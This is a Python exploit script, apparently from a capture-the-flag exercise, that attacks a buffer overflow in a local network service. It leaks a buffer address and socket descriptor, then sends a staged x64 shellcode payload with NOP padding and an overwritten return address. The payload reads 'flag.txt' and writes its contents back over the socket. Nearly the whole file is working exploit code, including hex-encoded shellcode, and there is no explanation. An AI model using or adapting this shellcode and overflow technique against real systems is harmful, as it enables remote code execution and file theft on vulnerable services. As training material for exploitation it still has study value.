#!/usr/bin/env python3
# -!- encoding:utf8 -!-
#-----------------------------------------------------------------------
# file:   exploit.py
# date:   2017-01-16
# author: koromodako
# purpose:
#       Performs a staged shellcode exploitation on a buffer overflow 
#       vulnerability
#-----------------------------------------------------------------------

import socket

NOP = b'\x90'
EXIT_1_x64=b'\x48\x31\xc0\x48\x31\xff\x40\xb7\x01\xb0\x3c\x0f\x05'
STAGER_x64_1=b'\x48\x31\xff\x48\x31\xf6\x40\xb6\x02\x48\xc1\xe6\x0b\x48\x31\xd2\xb2\x07\x4d\x31\xd2\x41\xb2\x22\x4d\x31\xc0\x4d\x31\xc9\x48\x31\xc0\xb0\x09\x0f\x05\x49\x89\xc4\x48\x31\xff\x40\xb7'
STAGER_x64_2=b'\x4c\x89\xe6\x48\x31\xd2\xb2\x02\x48\xc1\xe2\x0b\x48\x31\xc0\x0f\x05\x41\xff\xd4\x48\x31\xc0\xc3'
PAYLOAD_x64_1=b'\xeb\x70\x5b\x48\x31\xc0\x88\x43\x08\x48\x31\xff\x48\x31\xf6\x40\xb6\x02\x48\xc1\xe6\x0b\x48\x31\xd2\xb2\x07\x4d\x31\xd2\x41\xb2\x22\x4d\x31\xc0\x4d\x31\xc9\xb0\x09\x0f\x05\x49\x89\xc4\x48\x89\xdf\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\xb0\x02\x0f\x05\x48\x89\xc7\x4c\x89\xe6\x48\x31\xd2\xb2\x02\x48\xc1\xe2\x0b\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\xb7'
PAYLOAD_x64_2=b'\x4c\x89\xe6\x48\x31\xc2\x48\x31\xc0\xb0\x01\x0f\x05\x48\x31\xff\x40\xb7\x01\x48\x31\xc0\xb0\x3c\x0f\x05\xe8\x8b\xff\xff\xff\x66\x6c\x61\x67\x2e\x74\x78\x74\x4e'

def send_to(s, content):
    # print('sending: %s' % content)
    s.send(content)

def recv_from(s):
    content = s.recv(1024)
    print('receiving: %s' % content)
    return content

def prepare_stager_payload(shellcode, buf_addr, sd, expected_len):
    payload = shellcode
    while len(payload) < expected_len:
        payload += NOP
    l = len(buf_addr)
    addr = bytes()
    for k in range(0, int(l/2)):
        o = buf_addr[k*2]+ buf_addr[k*2+1]
        b = bytes([ int(o, 16) ])
        addr = b + addr
    payload += addr
    return payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 7979))

send_to(s, b'RDBG')
info = recv_from(s)
info_parts = info.split(b'\x00')[0].decode('utf-8').split('\n')
print(info_parts)
buf_addr = info_parts[0].strip().split(': ')[1][2:]
sd = int(info_parts[1].strip().split(': ')[1])
print('buf_addr: %s' % buf_addr)
print('sd: %s' % sd)
if sd > 0xff:
    print('socket descriptor too big... exploit failed!')
    exit(-1)
# prepare staging shellcode
stager = STAGER_x64_1 + bytes([ sd ]) + STAGER_x64_2
stager_payload = prepare_stager_payload(stager, buf_addr, sd, 80)
# send staging shellcode
send_to(s, stager_payload)
# prepare main payload
main_payload = PAYLOAD_x64_1 + bytes([ sd ]) + PAYLOAD_x64_2
# send main payload
send_to(s, main_payload)
# receive results
recv_from(s)
s.close()
print('bye!')
